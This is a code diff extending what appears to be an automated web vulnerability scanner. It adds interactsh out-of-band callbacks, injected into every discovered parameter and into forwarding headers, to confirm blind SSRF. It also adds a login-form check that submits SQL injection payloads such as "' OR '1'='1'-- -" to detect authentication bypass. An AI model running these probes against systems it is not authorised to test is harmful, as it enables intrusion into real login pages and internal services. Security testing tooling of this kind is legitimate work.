@@ -38,6 +38,8 @@ ap.add_argument("--depth", type=int, default=2, help="feroxbuster recursion dept
 ap.add_argument("--ports", action="store_true", help="port-scan resolved hosts (naabu) so httpx probes non-default ports too")
 ap.add_argument("--top-ports", dest="top_ports", type=int, default=100, help="naabu top-ports count (default 100)")
 ap.add_argument("--sqli", action="store_true", help="run sqlmap on the highest-value discovered params (heavy/noisy)")
+ap.add_argument("--oob", action="store_true", help="out-of-band testing via interactsh: confirms blind SSRF/RCE/SSTI/XXE by DNS/HTTP callback")
+ap.add_argument("--interactsh-server", dest="interactsh_server", default="", help="self-hosted interactsh server (default: public oast servers)")
 ap.add_argument("--setup", action="store_true", help="install/repair ALL dependencies (go tools + apt + nuclei templates), then exit unless a domain is given")
 ap.add_argument("--no-autosetup", dest="autosetup", action="store_false", help="do NOT auto-install missing go tools at startup")
 ap.set_defaults(test=True, autosetup=True)
@@ -78,6 +80,7 @@ GO_TOOLS = {
     "dalfox": "github.com/hahwul/dalfox/v2@latest",
     "subzy": "github.com/PentestPad/subzy@latest",
     "naabu": "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest",
+    "interactsh-client": "github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest",
 }
 APT_TOOLS = {"feroxbuster": "feroxbuster", "chromium": "chromium", "seclists": "seclists", "sqlmap": "sqlmap"}
 
@@ -278,7 +281,8 @@ def dir_host_done(host):
 _FIND_SEEN = set(); _find_lock = threading.Lock()
 # triage — the tool decides what is report-grade (oracle/evidence-confirmed) vs a lead to review
 _CONFIRMED_KINDS = {"sqli", "nosqli", "lfi", "ssti", "xss", "access-control", "unauth-data", "exposed-file",
-                    "secret", "open-redirect", "cors", "dir-listing", "takeover", "rce", "host-header", "header-inj"}
+                    "secret", "open-redirect", "cors", "dir-listing", "takeover", "rce", "host-header",
+                    "header-inj", "auth-bypass", "ssrf", "oob"}
 def _triage(kind, sev):
     if kind == "anomaly" or sev in ("low", "info"):
         return "investigate"
@@ -804,6 +808,21 @@ def _sim(a, b):
     if not a and not b: return 1.0
     return difflib.SequenceMatcher(None, a, b).ratio()
 
+def _login_succeeded(fail, ok):
+    """Heuristic: did an injection flip a failed login into an authenticated state?"""
+    fsc, fhd, fb = fail; osc, ohd, ob = ok
+    if fb is None or ob is None: return False
+    fcookie = any(k.lower() == "set-cookie" for k in fhd)
+    ocookie = any(k.lower() == "set-cookie" for k in ohd)
+    if ocookie and not fcookie: return True                      # session granted only on injection
+    if osc in (301,302,303,307,308) and fsc not in (301,302,303,307,308): return True
+    fail_login = bool(LOGIN_RE.search(fb)); ok_login = bool(LOGIN_RE.search(ob))
+    if fail_login and not ok_login and _sim(fb, ob) < 0.9:       # login form vanished on injection
+        low = ob.lower()
+        if not any(w in low for w in (b"invalid", b"incorrect", b"failed", b"error", b"try again")):
+            return True
+    return False
+
 def _timed_send(sender, payload):
     """sender(payload) -> (status, headers, body); returns elapsed seconds or None."""
     t0 = time.time()
@@ -896,6 +915,9 @@ def header_probe(url, host):
         sender = lambda v, _h=h: _get_hdr(url, _h, v)
         if sqli_probe(host, f"header {h} @ {url[:50]}", sender, do_time=_take_time_budget()):
             break
+    fq = oob_payload(host, f"SSRF via Host/Forwarded header @ {url[:50]}", url, "ssrf")   # blind SSRF via headers
+    if fq:
+        _get_hdr(url, "X-Forwarded-Host", fq); _get_hdr(url, "Referer", f"http://{fq}/")
 
 JSON_KEYS = ["q", "query", "search", "id", "user", "username", "name", "email", "filter"]
 def json_probe(url, host):
@@ -913,6 +935,78 @@ def json_probe(url, host):
         if body and (b'"auth":true' in low or b"token" in low) and sc not in (400, 401) and not base_tok:
             finding("crit", "nosqli", host, f"‼ NoSQL operator auth-bypass — {url}", url)
             return
+
+# ---- out-of-band (OOB) testing via interactsh: confirms blind SSRF/RCE/SSTI/XXE by DNS/HTTP callback ----
+_OOB = {"domain": None, "proc": None, "tokens": {}, "lock": threading.Lock(), "n": 0, "on": False}
+
+def oob_start():
+    if not A.oob: return
+    cli = tool("interactsh-client")
+    if not cli:
+        feed("--oob set but interactsh-client not found (go install …/interactsh-client)", "med"); return
+    cmd = [cli, "-json"] + (["-server", A.interactsh_server] if A.interactsh_server else [])
+    try:
+        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
+    except Exception as e:
+        feed(f"interactsh-client failed to start: {e}", "med"); return
+    _OOB["proc"] = p; _OOB["on"] = True
+    def reader():
+        for line in p.stdout:
+            line = line.strip()
+            if not line: continue
+            if not _OOB["domain"]:
+                m = _re.search(r'\b([a-z0-9]{10,}\.(?:oast\.[a-z]+|interact\.sh))\b', line, _re.I)
+                if m:
+                    _OOB["domain"] = m.group(1).lower()
+                    feed(f"🛰 OOB ready — interactsh callback domain {_OOB['domain']}", "info")
+                    continue
+            try: o = json.loads(line)
+            except Exception: continue
+            _oob_ingest(o)
+    threading.Thread(target=reader, daemon=True).start()
+    for _ in range(50):
+        if _OOB["domain"]: break
+        time.sleep(0.2)
+    if not _OOB["domain"]:
+        feed("interactsh: no callback domain (server unreachable?) — OOB inactive", "med"); _OOB["on"] = False
+
+def _oob_ingest(o):
+    """Correlate one interactsh interaction record to a registered token → finding."""
+    blob = json.dumps(o).lower()
+    proto = (o.get("protocol") or "oob").lower()
+    raddr = o.get("remote-address") or o.get("remote_address") or ""
+    with _OOB["lock"]:
+        for tok, ctx in list(_OOB["tokens"].items()):
+            if tok in blob:
+                finding("crit", ctx.get("kind", "ssrf"), ctx["host"],
+                        f"‼ OOB {proto} callback CONFIRMED — {ctx['label']}" + (f" (from {raddr})" if raddr else ""),
+                        ctx.get("url", ""))
+                _OOB["tokens"].pop(tok, None)
+                return True
+    return False
+
+def oob_payload(host, label, url="", kind="ssrf"):
+    """Return a unique callback hostname; a hit on it confirms `kind` for this context."""
+    if not (_OOB["on"] and _OOB["domain"]): return None
+    with _OOB["lock"]:
+        _OOB["n"] += 1; tok = f"r{_OOB['n']:04x}z"
+        _OOB["tokens"][tok] = {"host": host, "label": label, "url": url, "kind": kind}
+    return f"{tok}.{_OOB['domain']}"
+
+def oob_inject_param(url, param, host):
+    """Blind SSRF can hide in any param — fire an OOB URL payload into it."""
+    fq = oob_payload(host, f"SSRF via param '{param}' @ {url[:60]}", url, "ssrf")
+    if not fq: return
+    _get(_inject(url, param, urllib.parse.quote(f"http://{fq}/")), timeout=8)
+
+def oob_finish(wait=15):
+    if not _OOB["on"]: return
+    feed(f"🛰 waiting {wait}s for late OOB callbacks…", "info")
+    time.sleep(wait)
+    p = _OOB.get("proc")
+    if p:
+        try: p.terminate()
+        except Exception: pass
 
 # ---- HTML form discovery + POST field testing (catches login SQLi/auth-bypass + POST XSS) ----
 from html.parser import HTMLParser
@@ -961,6 +1055,22 @@ def form_recon(page_url, host):
             r = _post(action, data) if is_post else _get(action + "?" + urllib.parse.urlencode(data), timeout=10)
             if r and r[2] and XSS_MARK.encode() in r[2]:
                 finding("high", "xss", host, f"★ reflected unescaped in form field '{field}' → {action}", action)
+        # auth bypass on login forms: a failed login should stay failed; if an injection flips it
+        # to a logged-in state, that's an authentication bypass (SQLi/logic).
+        pw = [k for k in form["fields"] if "pass" in k.lower()]
+        us = [k for k in form["fields"] if k not in pw and any(t in k.lower() for t in ("user", "email", "login", "name", "id"))]
+        if pw and us:
+            uf, pf = us[0], pw[0]
+            def submit(uval, pval):
+                data = dict(base); data[uf] = uval; data[pf] = pval
+                return _post(action, data) if is_post else _get(action + "?" + urllib.parse.urlencode(data), timeout=12)
+            fail = submit(f"recon_nouser_{random.randint(1000,9999)}", "recon_nopass_x")
+            if fail:
+                for uval in ("' OR '1'='1'-- -", "admin'-- -", "' OR 1=1-- -", "' OR '1'='1"):
+                    ok = submit(uval, "x")
+                    if ok and _login_succeeded(fail, ok):
+                        finding("crit", "auth-bypass", host, f"‼ authentication bypass via login field '{uf}' → {action}", action)
+                        break
 
 ERR_SIGS = [b"sql syntax", b"mysql_", b"ora-0", b"odbc", b"sqlite", b"psql", b"syntax error",
             b"unterminated", b"unexpected token", b"stack trace", b"traceback (most recent",
@@ -1178,6 +1288,8 @@ def stage_vulns():
             sqli_probe(host, f"{param} @ {url[:60]} (GET)", _snd, do_time=use_time)
             # 6) behavioral / differential — signature-free anomaly (no fixed payload per bug)
             anomaly_probe(url, param, host)
+            # 7) blind SSRF / OOB — inject an interactsh callback URL (confirmed async by callback)
+            oob_inject_param(url, param, host)
     th = []
     for (url, param) in tasks:
         x = threading.Thread(target=test, args=(url, param), daemon=True); x.start(); th.append(x)
@@ -1647,11 +1759,13 @@ def run_pipeline():
         stage_dirs(live)
         tp.join()
         if A.test and STATE["running"]:
+            oob_start()                              # bring up interactsh OOB listener before active tests
             _skip_or_run("vulns", stage_vulns)       # confirmed checks + signature-free differential anomaly probe
             if STATE["running"]:
                 _skip_or_run("brain", stage_brain)   # signal routing: forms, upload points, tech notes
             if STATE["running"]:
                 _skip_or_run("intel", stage_intel)   # nuclei auto-templates (-as) + DAST fuzzing — detection logic in maintained YAML
+            oob_finish()                             # wait for late OOB callbacks, then stop interactsh
         else:
             for s in ("vulns", "brain", "intel"):
                 emit({"type": "stage", "stage": s, "state": "done", "pct": 100 if stage_done(s) else 0})
